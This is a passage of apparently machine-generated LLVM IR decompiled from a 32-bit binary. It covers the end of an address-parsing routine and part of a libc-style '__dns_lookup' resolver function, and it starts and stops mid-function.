dec_label_pc_805731a:                             ; preds = %dec_label_pc_8057306, %dec_label_pc_8057319
  %v1_805730a = phi i32 [ 0, %dec_label_pc_8057306 ], [ %v3_805730d, %dec_label_pc_8057319 ]
  %v4_805731a = phi i32 [ %v4_805731a.pre, %dec_label_pc_8057306 ], [ %v6_805731a, %dec_label_pc_8057319 ]
  %v0_8057319 = phi i32 [ %v0_80572f634, %dec_label_pc_8057306 ], [ %v1_8057319, %dec_label_pc_8057319 ]
  %v1_805731a = inttoptr i32 %v0_8057319 to i8*
  %v2_805731a = load i8, i8* %v1_805731a, align 1
  %v3_805731a = zext i8 %v2_805731a to i32
  %v5_805731a = and i32 %v4_805731a, -256
  %v6_805731a = or i32 %v3_805731a, %v5_805731a
  store i32 %v6_805731a, i32* @edx, align 4
  %v2_805731c = sext i8 %v2_805731a to i32
  %v2_805731f = mul nsw i32 %v2_805731c, 2
  %v3_805731f = add i32 %v2_805731f, %v0_80572f9.pre
  %v4_805731f = inttoptr i32 %v3_805731f to i16*
  %v5_805731f = load i16, i16* %v4_805731f, align 2
  %v2_8057324 = and i16 %v5_805731f, 8
  %v3_8057324 = icmp eq i16 %v2_8057324, 0
  %v1_8057326 = icmp eq i1 %v3_8057324, false
  br i1 %v1_8057326, label %dec_label_pc_805730a, label %dec_label_pc_8057328

dec_label_pc_8057328:                             ; preds = %dec_label_pc_805731a
  %v8_8057328 = sub nsw i32 2, %v2_805734235
  %v9_8057328 = and i32 %v8_8057328, %v2_805734235
  %v10_8057328 = icmp slt i32 %v9_8057328, 0
  %v11_8057328 = icmp eq i32 %v2_805734235, 3
  %v12_8057328 = icmp slt i32 %v2_805734235, 3
  %v3_805732c = icmp eq i1 %v12_8057328, %v10_8057328
  %v4_805732c = icmp eq i1 %v11_8057328, false
  %v5_805732c = and i1 %v4_805732c, %v3_805732c
  br i1 %v5_805732c, label %dec_label_pc_8057336, label %dec_label_pc_805732e

dec_label_pc_805732e:                             ; preds = %dec_label_pc_8057328
  %v10_805732e = icmp eq i8 %v2_805731a, 46
  %v1_8057331 = icmp eq i1 %v10_805732e, false
  br i1 %v1_8057331, label %dec_label_pc_8057368, label %dec_label_pc_8057333

dec_label_pc_8057333:                             ; preds = %dec_label_pc_805732e
  %v1_8057333 = add i32 %v0_8057319, 1
  store i32 %v1_8057333, i32* @ecx, align 4
  br label %dec_label_pc_805733f

dec_label_pc_8057336:                             ; preds = %dec_label_pc_8057328
  %v1_8057336 = add i32 %v0_8057319, 1
  store i32 %v1_8057336, i32* @ecx, align 4
  %v4_8057337 = icmp eq i8 %v2_805731a, 0
  br i1 %v4_8057337, label %dec_label_pc_805733f, label %dec_label_pc_805733b

dec_label_pc_805733b:                             ; preds = %dec_label_pc_8057336
  %v2_805733b = and i16 %v5_805731f, 32
  %v3_805733b = icmp eq i16 %v2_805733b, 0
  br i1 %v3_805733b, label %dec_label_pc_8057368, label %dec_label_pc_805733f

dec_label_pc_805733f:                             ; preds = %dec_label_pc_805733b, %dec_label_pc_8057336, %dec_label_pc_8057333
  %v0_80572f63 = phi i32 [ %v1_8057336, %dec_label_pc_805733b ], [ %v1_8057336, %dec_label_pc_8057336 ], [ %v1_8057333, %dec_label_pc_8057333 ]
  %v2_805733f = mul i32 %v0_805735d33, 256
  %v3_8057342 = add nuw nsw i32 %v2_805734235, 1
  %v2_8057345 = or i32 %v1_805730a, %v2_805733f
  %v7_805734b = icmp sgt i32 %v2_805734235, 3
  br i1 %v7_805734b, label %dec_label_pc_805734d, label %dec_label_pc_80572f6

dec_label_pc_805734d:                             ; preds = %dec_label_pc_805733f
  %v4_8057352 = icmp eq i32 %arg2, 0
  br i1 %v4_8057352, label %dec_label_pc_805736a, label %dec_label_pc_8057359

dec_label_pc_8057359:                             ; preds = %dec_label_pc_805734d
  %v1_805735d = call i32 @llvm.bswap.i32(i32 %v2_8057345)
  %v2_805735f = inttoptr i32 %arg2 to i32*
  store i32 %v1_805735d, i32* %v2_805735f, align 4
  br label %dec_label_pc_805736a

dec_label_pc_8057368:                             ; preds = %dec_label_pc_805733b, %dec_label_pc_805732e, %dec_label_pc_80572f6, %dec_label_pc_805730a, %entry
  br label %dec_label_pc_805736a

dec_label_pc_805736a:                             ; preds = %dec_label_pc_805734d, %dec_label_pc_8057359, %dec_label_pc_8057368
  %v0_805736f = phi i32 [ 1, %dec_label_pc_805734d ], [ 1, %dec_label_pc_8057359 ], [ 0, %dec_label_pc_8057368 ]
  ret i32 %v0_805736f

; uselistorder directives
  uselistorder i32 %v2_805731c, { 1, 0 }
  uselistorder i32 %v6_805731a, { 1, 0 }
  uselistorder i8 %v2_805731a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8057319, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8057311, { 1, 0 }
  uselistorder i32 %v3_805730d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80572f634, { 1, 0 }
  uselistorder i32 %v2_805734235, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 17, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 5, 18, 16 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805736a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057368, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805731a, { 1, 0 }
  uselistorder label %dec_label_pc_80572f6, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp37 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8057386 = call i32 @malloc(i32 512)
  store i32 %v2_8057386, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8057386, i32* @ebp, align 4
  %v2_8057394 = call i32 @malloc(i32 1025)
  store i32 %v2_8057394, i32* %eax.global-to-local, align 4
  %v12_805739d = ptrtoint i32* %stack_var_-236 to i32
  %v1_80573a0 = icmp eq i32 %v2_8057386, 0
  br i1 %v1_80573a0, label %dec_label_pc_8057a19, label %dec_label_pc_80573a8

dec_label_pc_80573a8:                             ; preds = %entry
  %v1_80573a8 = icmp eq i32 %v2_8057394, 0
  br i1 %v1_80573a8, label %dec_label_pc_8057a19, label %dec_label_pc_80573b0

dec_label_pc_80573b0:                             ; preds = %dec_label_pc_80573a8
  %v5_80573b0 = icmp eq i32 %arg2, 0
  br i1 %v5_80573b0, label %dec_label_pc_8057a19, label %dec_label_pc_80573be

dec_label_pc_80573be:                             ; preds = %dec_label_pc_80573b0
  %v4_80573be = ptrtoint i8* %arg1 to i32
  store i32 %v4_80573be, i32* %eax.global-to-local, align 4
  %v2_80573c5 = load i8, i8* %arg1, align 1
  %v3_80573c5 = icmp eq i8 %v2_80573c5, 0
  br i1 %v3_80573c5, label %dec_label_pc_8057a19, label %dec_label_pc_80573ce

dec_label_pc_80573ce:                             ; preds = %dec_label_pc_80573be
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_80573d2 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_80573d2, i32* %eax.global-to-local, align 4
  store i32 %v4_80573be, i32* %edx.global-to-local, align 4
  %v2_80573f5 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_80573f5, i32* @ebx, align 4
  %tmp50 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp50, i8** %stack_var_-252, align 4
  %v6_80573fd = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 134540701, i32 ptrtoint (i8** @global_var_80673e0.316 to i32))
  store i32 %v6_80573fd, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80673e0.316 to i8*), i8** %stack_var_-252, align 4
  %v2_8057409 = call i32 @pthread_mutex_lock(i32 ptrtoint (i8** @global_var_80673e0.316 to i32))
  %v0_805740e = load i64, i64* @global_var_80673f8.317, align 8
  %v1_805740e = trunc i64 %v0_805740e to i32
  %v1_8057413 = ashr i32 %v1_805740e, 31
  %v6_8057414 = and i64 %v0_805740e, 4294967295
  %v8_8057414 = zext i32 %v1_8057413 to i64
  %v9_8057414 = mul nuw i64 %v8_8057414, 4294967296
  %v10_8057414 = or i64 %v9_8057414, %v6_8057414
  %v14_8057414 = srem i64 %v10_8057414, %tmp37
  %v15_8057414 = trunc i64 %v14_8057414 to i32
  %v0_805741b = load i16, i16* @global_var_8062a44.318, align 4
  %v2_805742a = load i8*, i8** %stack_var_-252, align 4
  %v3_805742a = ptrtoint i8* %v2_805742a to i32
  store i32 %v3_805742a, i32* %eax.global-to-local, align 4
  store i32 134540701, i32* %edx.global-to-local, align 4
  store i8* %tmp50, i8** %stack_var_-252, align 4
  %v4_805742f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-52, i32 1)
  store i32 %v4_805742f, i32* %eax.global-to-local, align 4
  %v3_8057473 = sext i16 %v0_805741b to i32
  %v5_80575d6 = inttoptr i32 %v15_8057414 to i8*
  %v1_80579f491 = add i32 %v12_805739d, 28
  %v2_80579f492 = inttoptr i32 %v1_80579f491 to i32*
  %v3_80579f493 = load i32, i32* %v2_80579f492, align 4
  %tmp126 = icmp ult i32 %v3_80579f493, 3
  br i1 %tmp126, label %dec_label_pc_8057454, label %dec_label_pc_8057a19

dec_label_pc_8057454:                             ; preds = %dec_label_pc_80573ce, %dec_label_pc_80579f4.backedge
  %v0_805745b99 = phi i32 [ %v0_80579f4.pre, %dec_label_pc_80579f4.backedge ], [ %v12_805739d, %dec_label_pc_80573ce ]
  %v1_8057454 = add i32 %v0_805745b99, 20
  %v2_8057454 = inttoptr i32 %v1_8057454 to i32*
  %v3_8057454 = load i32, i32* %v2_8057454, align 4
  %v13_8057454 = icmp eq i32 %v3_8057454, -1
  br i1 %v13_8057454, label %dec_label_pc_8057454.dec_label_pc_805746a_crit_edge, label %dec_label_pc_805745b

dec_label_pc_8057454.dec_label_pc_805746a_crit_edge: ; preds = %dec_label_pc_8057454
  %v0_805746a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805746a

dec_label_pc_805745b:                             ; preds = %dec_label_pc_8057454
  %v3_805745e = load i32, i32* %v2_8057454, align 4
  %v5_805745e = add i32 %v0_805745b99, -16
  %v6_805745e = inttoptr i32 %v5_805745e to i32*
  store i32 %v3_805745e, i32* %v6_805745e, align 4
  %v1_8057462 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8057462, i32* %eax.global-to-local, align 4
  %v0_8057467 = load i32, i32* @esp, align 4
  %v1_8057467 = add i32 %v0_8057467, 16
  br label %dec_label_pc_805746a

dec_label_pc_805746a:                             ; preds = %dec_label_pc_8057454.dec_label_pc_805746a_crit_edge, %dec_label_pc_805745b
  %v1_805746a = phi i32 [ %v0_805745b99, %dec_label_pc_8057454.dec_label_pc_805746a_crit_edge ], [ %v1_8057467, %dec_label_pc_805745b ]
  %v0_805746a = phi i32 [ %v0_805746a.pre, %dec_label_pc_8057454.dec_label_pc_805746a_crit_edge ], [ %v1_8057462, %dec_label_pc_805745b ]
  %v2_805746a = add i32 %v1_805746a, -4
  %v3_805746a = inttoptr i32 %v2_805746a to i32*
  store i32 %v0_805746a, i32* %v3_805746a, align 4
  %v1_805746b = add i32 %v1_805746a, -8
  %v2_805746b = inttoptr i32 %v1_805746b to i32*
  store i32 512, i32* %v2_805746b, align 4
  %v1_8057470 = add i32 %v1_805746a, -12
  %v2_8057470 = inttoptr i32 %v1_8057470 to i32*
  store i32 0, i32* %v2_8057470, align 4
  %v2_8057472 = add i32 %v1_805746a, -16
  %v3_8057472 = inttoptr i32 %v2_8057472 to i32*
  store i32 %v2_8057386, i32* %v3_8057472, align 4
  %v5_8057473 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v5_8057473, i32* %eax.global-to-local, align 4
  %v0_8057478 = load i32, i32* @esp, align 4
  %v1_805747b = add i32 %v0_8057478, 8
  %v2_805747b = inttoptr i32 %v1_805747b to i32*
  store i32 48, i32* %v2_805747b, align 4
  %v1_805747d = add i32 %v0_8057478, 4
  %v2_805747d = inttoptr i32 %v1_805747d to i32*
  store i32 0, i32* %v2_805747d, align 4
  %v1_805747f = add i32 %v0_8057478, 84
  store i32 %v1_805747f, i32* @ebx, align 4
  %v3_8057483 = inttoptr i32 %v0_8057478 to i32*
  store i32 %v1_805747f, i32* %v3_8057483, align 4
  %v5_8057484 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v5_8057484, i32* %eax.global-to-local, align 4
  %v0_8057489 = load i32, i32* @esp, align 4
  %v1_8057489 = add i32 %v0_8057489, 60
  %v2_8057489 = inttoptr i32 %v1_8057489 to i32*
  %v3_8057489 = load i32, i32* %v2_8057489, align 4
  store i32 %v3_8057489, i32* %eax.global-to-local, align 4
  %v1_805748d = add i32 %v0_8057489, 116
  %v2_805748d = inttoptr i32 %v1_805748d to i32*
  store i32 1, i32* %v2_805748d, align 4
  %v0_8057495 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057495 = add i32 %v0_8057495, 1
  %v0_8057496 = load i32, i32* @esp, align 4
  %v1_8057496 = add i32 %v0_8057496, 104
  %v2_8057496 = inttoptr i32 %v1_8057496 to i32*
  store i32 1, i32* %v2_8057496, align 4
  %v1_805749e = urem i32 %v1_8057495, 65536
  store i32 %v1_805749e, i32* %eax.global-to-local, align 4
  %v1_80574a3 = load i32, i32* @esp, align 4
  %v2_80574a3 = add i32 %v1_80574a3, 60
  %v3_80574a3 = inttoptr i32 %v2_80574a3 to i32*
  store i32 %v1_805749e, i32* %v3_80574a3, align 4
  %v0_80574a7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80574a7 = load i32, i32* @esp, align 4
  %v2_80574a7 = add i32 %v1_80574a7, 84
  %v3_80574a7 = inttoptr i32 %v2_80574a7 to i32*
  store i32 %v0_80574a7, i32* %v3_80574a7, align 4
  %v0_80574ab = load i32, i32* @esp, align 4
  %v1_80574ae = add i32 %v0_80574ab, 8
  %v2_80574ae = inttoptr i32 %v1_80574ae to i32*
  store i32 512, i32* %v2_80574ae, align 4
  %v2_80574b3 = add i32 %v0_80574ab, 4
  %v3_80574b3 = inttoptr i32 %v2_80574b3 to i32*
  store i32 %v2_8057386, i32* %v3_80574b3, align 4
  %v0_80574b4 = load i32, i32* @ebx, align 4
  %v3_80574b4 = inttoptr i32 %v0_80574ab to i32*
  store i32 %v0_80574b4, i32* %v3_80574b4, align 4
  %v0_80574b5 = call i32 @__encode_header()
  store i32 %v0_80574b5, i32* %eax.global-to-local, align 4
  %v0_80574ba = load i32, i32* @esp, align 4
  store i32 %v0_80574b5, i32* @ebx, align 4
  %v2_80574bf = icmp slt i32 %v0_80574b5, 0
  br i1 %v2_80574bf, label %dec_label_pc_8057a19, label %dec_label_pc_80574c7

dec_label_pc_80574c7:                             ; preds = %dec_label_pc_805746a
  %v2_80574c7 = add i32 %v0_80574ba, 12
  %v3_80574c7 = inttoptr i32 %v2_80574c7 to i32*
  store i32 %v0_80574b5, i32* %v3_80574c7, align 4
  %v1_80574c8 = add i32 %v0_80574ba, 8
  %v2_80574c8 = inttoptr i32 %v1_80574c8 to i32*
  store i32 1025, i32* %v2_80574c8, align 4
  %v1_80574cd = add i32 %v0_80574ba, 256
  %v2_80574cd = inttoptr i32 %v1_80574cd to i32*
  %v3_80574cd = load i32, i32* %v2_80574cd, align 4
  %v5_80574cd = add i32 %v0_80574ba, 4
  %v6_80574cd = inttoptr i32 %v5_80574cd to i32*
  store i32 %v3_80574cd, i32* %v6_80574cd, align 4
  %v1_80574d4 = add i32 %v0_80574ba, 28
  %v2_80574d4 = inttoptr i32 %v1_80574d4 to i32*
  %v3_80574d4 = load i32, i32* %v2_80574d4, align 4
  %v6_80574d4 = inttoptr i32 %v0_80574ba to i32*
  store i32 %v3_80574d4, i32* %v6_80574d4, align 4
  %v5_80574d8 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8057414, i32 %v3_8057473)
  %v0_80574dd = load i32, i32* @esp, align 4
  %v1_80574e0 = add i32 %v0_80574dd, 8
  %v2_80574e0 = inttoptr i32 %v1_80574e0 to i32*
  store i32 ptrtoint (i32* @global_var_8062a48.233 to i32), i32* %v2_80574e0, align 4
  %v1_80574e5 = add i32 %v0_80574dd, 4
  %v2_80574e5 = inttoptr i32 %v1_80574e5 to i32*
  store i32 134540701, i32* %v2_80574e5, align 4
  %v1_80574ea = add i32 %v0_80574dd, 200
  store i32 %v1_80574ea, i32* %eax.global-to-local, align 4
  %v3_80574f1 = inttoptr i32 %v0_80574dd to i32*
  store i32 %v1_80574ea, i32* %v3_80574f1, align 4
  %v5_80574f2 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v5_80574f2, i32* %eax.global-to-local, align 4
  %v0_80574f7 = load i32, i32* @esp, align 4
  %v1_80574f7 = inttoptr i32 %v0_80574f7 to i32*
  store i32 ptrtoint (i32* @global_var_8062a48.233 to i32), i32* %v1_80574f7, align 4
  %v1_80574fe = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_80574fe, i32* %eax.global-to-local, align 4
  %v0_8057503 = load i32, i32* @esp, align 4
  %v1_8057503 = add i32 %v0_8057503, 56
  %v2_8057503 = inttoptr i32 %v1_8057503 to i32*
  %v3_8057503 = load i32, i32* %v2_8057503, align 4
  store i32 %v3_8057503, i32* %edx.global-to-local, align 4
  %v1_8057507 = add i32 %v0_8057503, 268
  %v2_8057507 = inttoptr i32 %v1_8057507 to i32*
  %v3_8057507 = load i32, i32* %v2_8057507, align 4
  store i32 %v3_8057507, i32* %eax.global-to-local, align 4
  %v2_805750e = mul i32 %v3_8057503, 4
  %v3_805750e = add i32 %v3_8057507, %v2_805750e
  %v4_805750e = inttoptr i32 %v3_805750e to i32*
  %v5_805750e = load i32, i32* %v4_805750e, align 4
  store i32 %v5_805750e, i32* %edx.global-to-local, align 4
  %v2_8057511 = add i32 %v0_8057503, 48
  %v3_8057511 = inttoptr i32 %v2_8057511 to i32*
  store i32 %v5_805750e, i32* %v3_8057511, align 4
  %v0_8057515 = load i32, i32* @esp, align 4
  %v1_8057515 = add i32 %v0_8057515, 16
  %v1_8057518 = add i32 %v0_8057515, 52
  %v2_8057518 = inttoptr i32 %v1_8057518 to i32*
  %v3_8057518 = load i32, i32* %v2_8057518, align 4
  %v5_8057518 = icmp slt i32 %v3_8057518, 0
  br i1 %v5_8057518, label %dec_label_pc_80574c7.dec_label_pc_805755e_crit_edge, label %dec_label_pc_805751f

dec_label_pc_80574c7.dec_label_pc_805755e_crit_edge: ; preds = %dec_label_pc_80574c7
  %v0_805755e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805755e

dec_label_pc_805751f:                             ; preds = %dec_label_pc_80574c7
  store i32 %v3_8057518, i32* %eax.global-to-local, align 4
  %v1_8057523 = load i32, i32* @global_var_8067ac4.319, align 4
  %v2_8057523 = sub i32 %v3_8057518, %v1_8057523
  %v8_8057523 = xor i32 %v1_8057523, %v3_8057518
  %v9_8057523 = xor i32 %v2_8057523, %v3_8057518
  %v10_8057523 = and i32 %v9_8057523, %v8_8057523
  %v11_8057523 = icmp slt i32 %v10_8057523, 0
  %v13_8057523 = icmp slt i32 %v2_8057523, 0
  %v2_8057529 = icmp eq i1 %v13_8057523, %v11_8057523
  br i1 %v2_8057529, label %dec_label_pc_805755e, label %dec_label_pc_805752b

dec_label_pc_805752b:                             ; preds = %dec_label_pc_805751f
  %v2_805752b = add i32 %v0_8057515, 12
  %v3_805752b = inttoptr i32 %v2_805752b to i32*
  store i32 %v3_8057518, i32* %v3_805752b, align 4
  %v1_805752c = add i32 %v0_8057515, 8
  %v2_805752c = inttoptr i32 %v1_805752c to i32*
  store i32 1025, i32* %v2_805752c, align 4
  %v1_8057531 = add i32 %v0_8057515, 4
  %v2_8057531 = inttoptr i32 %v1_8057531 to i32*
  store i32 ptrtoint (i32* @global_var_805cc08.320 to i32), i32* %v2_8057531, align 4
  %v1_8057536 = add i32 %v0_8057515, 28
  %v2_8057536 = inttoptr i32 %v1_8057536 to i32*
  %v3_8057536 = load i32, i32* %v2_8057536, align 4
  %v6_8057536 = inttoptr i32 %v0_8057515 to i32*
  store i32 %v3_8057536, i32* %v6_8057536, align 4
  %v0_805753a = call i32 @__GI_strncat()
  store i32 %v0_805753a, i32* %eax.global-to-local, align 4
  %v0_805753f = load i32, i32* @esp, align 4
  %v1_8057542 = add i32 %v0_805753f, 8
  %v2_8057542 = inttoptr i32 %v1_8057542 to i32*
  store i32 1025, i32* %v2_8057542, align 4
  %v1_8057547 = add i32 %v0_805753f, 52
  %v2_8057547 = inttoptr i32 %v1_8057547 to i32*
  %v3_8057547 = load i32, i32* %v2_8057547, align 4
  store i32 %v3_8057547, i32* %edx.global-to-local, align 4
  %v1_805754b = mul i32 %v3_8057547, 4
  %v2_805754b = add i32 %v1_805754b, 134642340
  %v3_805754b = inttoptr i32 %v2_805754b to i32*
  %v4_805754b = load i32, i32* %v3_805754b, align 4
  %v6_805754b = add i32 %v0_805753f, 4
  %v7_805754b = inttoptr i32 %v6_805754b to i32*
  store i32 %v4_805754b, i32* %v7_805754b, align 4
  %v1_8057552 = add i32 %v0_805753f, 28
  %v2_8057552 = inttoptr i32 %v1_8057552 to i32*
  %v3_8057552 = load i32, i32* %v2_8057552, align 4
  %v6_8057552 = inttoptr i32 %v0_805753f to i32*
  store i32 %v3_8057552, i32* %v6_8057552, align 4
  %v0_8057556 = call i32 @__GI_strncat()
  store i32 %v0_8057556, i32* %eax.global-to-local, align 4
  %v0_805755b = load i32, i32* @esp, align 4
  %v1_805755b = add i32 %v0_805755b, 16
  br label %dec_label_pc_805755e

dec_label_pc_805755e:                             ; preds = %dec_label_pc_80574c7.dec_label_pc_805755e_crit_edge, %dec_label_pc_805751f, %dec_label_pc_805752b
  %v1_805755e = phi i32 [ %v1_8057515, %dec_label_pc_80574c7.dec_label_pc_805755e_crit_edge ], [ %v1_8057515, %dec_label_pc_805751f ], [ %v1_805755b, %dec_label_pc_805752b ]
  %v0_805755e = phi i32 [ %v0_805755e.pre, %dec_label_pc_80574c7.dec_label_pc_805755e_crit_edge ], [ %v3_8057518, %dec_label_pc_805751f ], [ %v0_8057556, %dec_label_pc_805752b ]
  %v2_805755e = add i32 %v1_805755e, -4
  %v3_805755e = inttoptr i32 %v2_805755e to i32*
  store i32 %v0_805755e, i32* %v3_805755e, align 4
  %v0_805755f = load i32, i32* %eax.global-to-local, align 4
  %v2_805755f = add i32 %v1_805755e, -8
  %v3_805755f = inttoptr i32 %v2_805755f to i32*
  store i32 %v0_805755f, i32* %v3_805755f, align 4
  %v1_8057560 = add i32 %v1_805755e, -12
  %v2_8057560 = inttoptr i32 %v1_8057560 to i32*
  store i32 1, i32* %v2_8057560, align 4
  %v1_8057562 = add i32 %v1_805755e, 184
  store i32 %v1_8057562, i32* %eax.global-to-local, align 4
  %v2_8057569 = add i32 %v1_805755e, -16
  %v3_8057569 = inttoptr i32 %v2_8057569 to i32*
  store i32 %v1_8057562, i32* %v3_8057569, align 4
  %v3_805756a = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8057414)
  store i32 %v3_805756a, i32* %eax.global-to-local, align 4
  %v0_805756f = load i32, i32* @esp, align 4
  %v1_805756f = add i32 %v0_805756f, 28
  %v2_805756f = inttoptr i32 %v1_805756f to i32*
  %v3_805756f = load i32, i32* %v2_805756f, align 4
  store i32 %v3_805756f, i32* %eax.global-to-local, align 4
  %v1_8057573 = add i32 %v0_805756f, 260
  %v2_8057573 = inttoptr i32 %v1_8057573 to i32*
  %v3_8057573 = load i32, i32* %v2_8057573, align 4
  store i32 %v3_8057573, i32* @edx, align 4
  %v2_805757a = add i32 %v0_805756f, 216
  %v3_805757a = inttoptr i32 %v2_805757a to i32*
  store i32 %v3_805756f, i32* %v3_805757a, align 4
  %v0_8057581 = load i32, i32* @edx, align 4
  %v1_8057581 = load i32, i32* @esp, align 4
  %v2_8057581 = add i32 %v1_8057581, 220
  %v3_8057581 = inttoptr i32 %v2_8057581 to i32*
  store i32 %v0_8057581, i32* %v3_8057581, align 4
  %v0_8057588 = load i32, i32* @esp, align 4
  %v1_8057588 = add i32 %v0_8057588, 224
  %v2_8057588 = inttoptr i32 %v1_8057588 to i32*
  store i32 1, i32* %v2_8057588, align 4
  %v0_8057598 = load i32, i32* @esp, align 4
  %v1_805759b = load i32, i32* @ebx, align 4
  %v2_805759b = sub i32 512, %v1_805759b
  %v2_805759d = add i32 %v0_8057598, 8
  %v3_805759d = inttoptr i32 %v2_805759d to i32*
  store i32 %v2_805759b, i32* %v3_805759d, align 4
  %v1_805759e = load i32, i32* @ebx, align 4
  %v2_805759e = add i32 %v1_805759e, %v2_8057386
  %v2_80575a2 = add i32 %v0_8057598, 4
  %v3_80575a2 = inttoptr i32 %v2_80575a2 to i32*
  store i32 %v2_805759e, i32* %v3_80575a2, align 4
  %v1_80575a3 = add i32 %v0_8057598, 216
  store i32 %v1_80575a3, i32* @eax, align 4
  %v3_80575aa = inttoptr i32 %v0_8057598 to i32*
  store i32 %v1_80575a3, i32* %v3_80575aa, align 4
  %v0_80575ab = call i32 @__encode_question()
  store i32 %v0_80575ab, i32* %eax.global-to-local, align 4
  %v0_80575b0 = load i32, i32* @esp, align 4
  store i32 %v0_80575ab, i32* @esi, align 4
  %v2_80575b5 = icmp slt i32 %v0_80575ab, 0
  br i1 %v2_80575b5, label %dec_label_pc_8057a19, label %dec_label_pc_80575bd

dec_label_pc_80575bd:                             ; preds = %dec_label_pc_805755e
  %v1_80575bd = add i32 %v0_80575b0, 172
  %v2_80575bd = inttoptr i32 %v1_80575bd to i16*
  store i16 2, i16* %v2_80575bd, align 2
  %v1_80575c7 = load i32, i32* @esp, align 4
  %v2_80575c7 = add i32 %v1_80575c7, -4
  %v3_80575c7 = inttoptr i32 %v2_80575c7 to i32*
  store i32 %v0_80575ab, i32* %v3_80575c7, align 4
  %v1_80575c8 = add i32 %v1_80575c7, 164
  store i32 %v1_80575c8, i32* %eax.global-to-local, align 4
  %v2_80575cf = add i32 %v1_80575c7, -8
  %v3_80575cf = inttoptr i32 %v2_80575cf to i32*
  store i32 %v1_80575c8, i32* %v3_80575cf, align 4
  %v1_80575d0 = add i32 %v1_80575c7, 32
  %v2_80575d0 = inttoptr i32 %v1_80575d0 to i32*
  %v3_80575d0 = load i32, i32* %v2_80575d0, align 4
  %v5_80575d0 = add i32 %v1_80575c7, -12
  %v6_80575d0 = inttoptr i32 %v5_80575d0 to i32*
  store i32 %v3_80575d0, i32* %v6_80575d0, align 4
  %v1_80575d4 = add i32 %v1_80575c7, -16
  %v2_80575d4 = inttoptr i32 %v1_80575d4 to i32*
  store i32 10, i32* %v2_80575d4, align 4
  %v6_80575d6 = call i32 @inet_pton(i32 -1, i8* %v5_80575d6, i32 %v3_8057473, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_80575d6, i32* %eax.global-to-local, align 4
  %v0_80575db = load i32, i32* @esp, align 4
  %v1_80575db = add i32 %v0_80575db, 16
  %tmp51 = icmp slt i32 %v6_80575d6, 1
  br i1 %tmp51, label %dec_label_pc_80575ec, label %dec_label_pc_80575e2

dec_label_pc_80575e2:                             ; preds = %dec_label_pc_80575bd
  %v1_80575e2 = add i32 %v0_80575db, 172
  %v2_80575e2 = inttoptr i32 %v1_80575e2 to i16*
  store i16 10, i16* %v2_80575e2, align 2
  %v0_80575ec.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80575ec

dec_label_pc_80575ec:                             ; preds = %dec_label_pc_80575bd, %dec_label_pc_80575e2
  %v0_8057603 = phi i32 [ %v1_80575db, %dec_label_pc_80575bd ], [ %v0_80575ec.pre, %dec_label_pc_80575e2 ]
  %v1_80575ec = add i32 %v0_8057603, 156
  %v2_80575ec = inttoptr i32 %v1_80575ec to i16*
  %v3_80575ec = load i16, i16* %v2_80575ec, align 2
  %v12_80575ec = icmp eq i16 %v3_80575ec, 10
  %v1_80575f5 = icmp eq i1 %v12_80575ec, false
  %v1_8057603 = add i32 %v0_8057603, 158
  %v2_8057603 = inttoptr i32 %v1_8057603 to i16*
  store i16 13568, i16* %v2_8057603, align 2
  %v0_805760d = load i32, i32* @esp, align 4
  br i1 %v1_80575f5, label %dec_label_pc_8057603, label %dec_label_pc_8057623

dec_label_pc_8057603:                             ; preds = %dec_label_pc_80575ec
  %v1_8057610 = add i32 %v0_805760d, 32
  %v2_8057610 = inttoptr i32 %v1_8057610 to i32*
  %v3_8057610 = load i32, i32* %v2_8057610, align 4
  %v5_8057610 = add i32 %v0_805760d, -16
  %v6_8057610 = inttoptr i32 %v5_8057610 to i32*
  store i32 %v3_8057610, i32* %v6_8057610, align 4
  %v1_8057614 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8057614, i32* %eax.global-to-local, align 4
  %v1_8057619 = load i32, i32* @esp, align 4
  %v2_8057619 = add i32 %v1_8057619, 176
  %v3_8057619 = inttoptr i32 %v2_8057619 to i32*
